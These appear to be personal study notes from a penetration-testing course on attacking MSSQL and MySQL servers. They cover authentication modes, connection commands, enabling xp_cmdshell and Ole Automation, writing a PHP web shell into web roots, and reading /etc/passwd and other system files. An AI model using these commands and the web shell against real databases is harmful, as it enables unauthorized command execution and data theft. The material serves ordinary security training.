## Authentication Mechanisms

`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:

| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |
`MySQL` also supports different [authentication methods](https://dev.mysql.com/doc/internals/en/authentication-method.html), such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can [choose an authentication mode](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) for many reasons, including compatibility, security, usability, and more. However, depending on which method is implemented, misconfigurations can occur.

---
#### Misconfigurations
If anonymous access is enabled, a user without a password is configured, or any user, group, or machine is allowed to access the SQL Server.

---
#### Privileges

Depending on the user's privileges, we may be able to perform different actions within a SQL Server, such as:

- Read or change the contents of a database
- Read or change the server configuration
- Execute commands
- Read local files
- Communicate with other databases
- Capture the local system hash
- Impersonate existing users
- Gain access to other networks

---
### Connecting to DBMS

#### MySQL - Connecting to the SQL Server
```shell-session
mysql -u julio -pPassword123 -h 10.129.20.13
```

#### Sqlcmd - Connecting to the SQL Server - MSSQL
```cmd-session
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

#### `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`
```shell-session
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

Note: When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.
```

#### Impacket with the name mssqlclient.py
```shell-session
mssqlclient.py -p 1433 julio@10.129.203.7 
```
![[Pasted image 20260215133502.png]]

If we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. 
```shell-session
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

#### SQL Default Databases
`MySQL` default system schemas/databases:

- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

`MSSQL` default system schemas/databases:

- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

---
#### SQL Syntax

#### Show Databases
```sql
mysql> SHOW DATABASES;
```

```sql
-- sqlcmd
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```


#### Select a Database
```shell-session
mysql> USE htbusers;
```

```cmd-session
1> USE htbusers
2> GO
```

#### Show Tables
```shell-session
SHOW TABLES;
```

```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```


#### Select all Data from Table "users"
```shell-session
mysql> SELECT * FROM users;
```

```cmd-session
1> SELECT * FROM users
2> go
```

### MSSQL - Execute Commands

If we have the appropriate privileges, we can use the SQL database to execute system commands or create the necessary elements to do it.

`MSSQL` has a [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) called [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:

- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing [sp_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

```sql
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

### MySQL - Execute Commands by writing files

Explained in depth - [[7. Writing files]]

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. For example, suppose `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET. If we have the appropriate privileges, we can attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. Then we can browse to the location where the file is and execute our commands.

#### MySQL - Write Local File

  Attacking SQL Databases

```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

#### MySQL - Secure File Privileges

  Attacking SQL Databases

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

### MSSQL - Execute Commands by writing files

To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:

#### MSSQL - Enable Ole Automation Procedures
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

#### MSSQL - Create a File
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

---
## Read Local Files

#### Read Local Files in MSSQL

By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

#### MySQL - Read Local Files in MySQL

As we previously mentioned, by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```
